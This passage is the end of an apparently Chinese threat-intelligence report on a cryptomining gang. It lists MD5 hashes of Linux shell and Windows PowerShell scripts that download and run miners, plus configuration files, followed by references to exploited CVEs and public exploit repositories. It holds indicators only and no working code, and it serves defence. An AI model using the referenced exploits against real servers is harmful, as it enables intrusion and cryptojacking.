c1a653ffe732a238822092072d3b1c2d  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
c2f01f208c96fbaa5768ac9f6104250e  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
c3a13920f5d75270890d62d0be38e719  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
c78415001298a818f961555de575d2fb  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
d097cfbf23e75191f8094e319200521d  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
d41e6009471bd340a2b693b44c014323  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
d58d2b4b1653bb27eab252a2d41dbaea  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
da9d3e7d912ede7328cc9735a2de4d51  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
db3ae99764596ba49e6650253bc82557  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
de9d981ac9cd8067078242daa610ed8f  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
e1f58848a987f23fe990dc7d47014756  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
e2fd8a0bc98b85857c1508e645038cd2  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
e334a7284acd38141c7e80cece0ed9e5  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
e96deab7e84efe3e44935797a103dc08  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
ec6b0af3dba82a5011503be846ed4221  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
f0773ffd1f0347188ef8c7d54e8f72c7  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
f2c5331ba4d75093852dab89db4d85fa  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
f3c6a83c7a8d341e773fa400b0ebf892  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
f64810aec556ffed2a4efcd7ef803006  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
f74316d78c172f0565b1477a43758ceb  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
f767521a543290007c22a5656dc7471d  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
f7d069b52c7aaf3924783f5725608247  |  Linux Shell脚本，用于下载执行挖矿程序和配置文件  
3b606595fe4496d679be0fc0b4eb043e  |  windows ps脚本，用于下载执行挖矿程序  
66f4384f35b17243c1f5f174572322f8  |  windows ps脚本，用于下载执行挖矿程序  
b846cad468d928a7dc1d16d44c4f6e44  |  windows ps脚本，用于下载执行挖矿程序  
d3d10faa69a10ac754e3b7dde9178c22  |  windows ps脚本，用于下载执行挖矿程序  
eab45a0186092fc8b8ec92135460a311  |  windows ps脚本，用于下载执行挖矿程序  
eed97fa219ef050a29b1c72c970892e8  |  windows ps脚本，用于下载执行挖矿程序  
03830406021978f97da30cbe1331ca8a  |  配置文件  
3373e5c87350d7b0ea5e51b0f3d186b6  |  配置文件  
406e36c5071eabe729bcd6da0cf09006  |  配置文件  
88bcf358fcd60197f418cd1182ea75bb  |  配置文件  
97f11060c28da973410a7e57ed3ed902  |  配置文件  
aac77aad811a72860d4d418b04c5bdff  |  配置文件  
  
## 参考

[1].https://groups.google.com/a/dcos.io/d/topic/users/NF4wMQ2VrJ8

[2].https://github.com/xmrig/xmrig

[3].https://github.com/lukacci/cpuhunter

[4].http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271

[5].https://www.blueliv.com/blog-news/research/drupalgeddon2-sa-core-2018-002-cve-2018-7600/

[6].http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600

[7].https://cert.360.cn/report/detail?id=c92cfff2634a44c8b1d6bd5e64c07f3d

[8].https://github.com/a2u/CVE-2018-7600

[9].http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12149

[10].http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12635

[11].http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12636

[12].https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers

[13].https://www.reddit.com/r/MoneroMining/comments/7nv8h6/xmrig_hackers/

[14].https://blog.csdn.net/Dancen/article/details/75313424

[15].https://www.cnblogs.com/birdstudio/p/7650622.html

[16].https://www.fireeye.com/blog/threat-research/2018/02/cve-2017-10271-used-to-deliver-cryptominers.html

## 原文链接

https://ti.360.net/blog/articles/8220-mining-gang-in-china/  

